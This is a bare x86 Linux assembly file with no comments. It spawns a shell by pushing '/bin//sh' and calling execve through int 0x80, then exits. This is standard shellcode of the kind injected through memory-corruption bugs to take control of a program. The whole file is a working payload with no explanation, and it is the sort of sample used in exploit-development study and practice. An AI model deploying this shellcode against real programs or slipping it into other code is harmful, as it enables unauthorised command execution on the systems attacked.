BITS 32

xor eax,eax
push eax
mov al, 0xb
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx, ecx
xor edx, edx
int 0x80

mov al,0x1
xor ebx,ebx
int 0x80
